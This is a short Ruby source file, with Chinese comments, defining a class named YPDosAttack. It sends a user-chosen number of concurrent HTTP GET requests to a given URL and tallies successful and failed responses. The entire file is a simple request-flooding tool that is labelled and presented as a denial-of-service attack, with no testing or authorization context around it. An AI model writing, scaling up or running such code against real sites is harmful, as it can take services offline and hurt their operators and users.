require 'net/http'
require 'uri'

class YPDosAttack
    def self.dosattack(argvs)
        url = argvs[1]
        request_count = argvs[2]

        uri = URI(url) # 修改为你想要请求的网址

        n = 10 # 发送 10 个请求
        concurrency = 5 # 使用 5 个线程
        if request_count
            n = request_count.to_i
        end
        
        success_count = 0 # 计数器，记录成功次数
        failure_count = 0 # 计数器，记录失败次数
        
        mutex = Mutex.new # 互斥锁，用于对计数器的操作加锁
        
        responses = Array.new(n) # 用于保存响应结果的数组
        
        threads = []
        
        n.times do |i|
          threads << Thread.new do
            begin
              response = Net::HTTP.get_response(uri)
              mutex.synchronize do
                if response.is_a?(Net::HTTPSuccess)
                  success_count += 1
                else
                  failure_count += 1
                end
              end
              puts "当前请求结果 #{response.code} #{response.message}" + " -------- #{failure_count + success_count}"
            rescue StandardError => e
              failure_count += 1
              puts "当前请求结果 #{e}" + " -------- #{failure_count + success_count}"
            end
          end
        
          threads.pop(concurrency - 1).each(&:join) if threads.size >= concurrency
        end
        
        threads.each(&:join)
        
        puts "成功次数: #{success_count}，失败次数: #{failure_count}"

    end
end
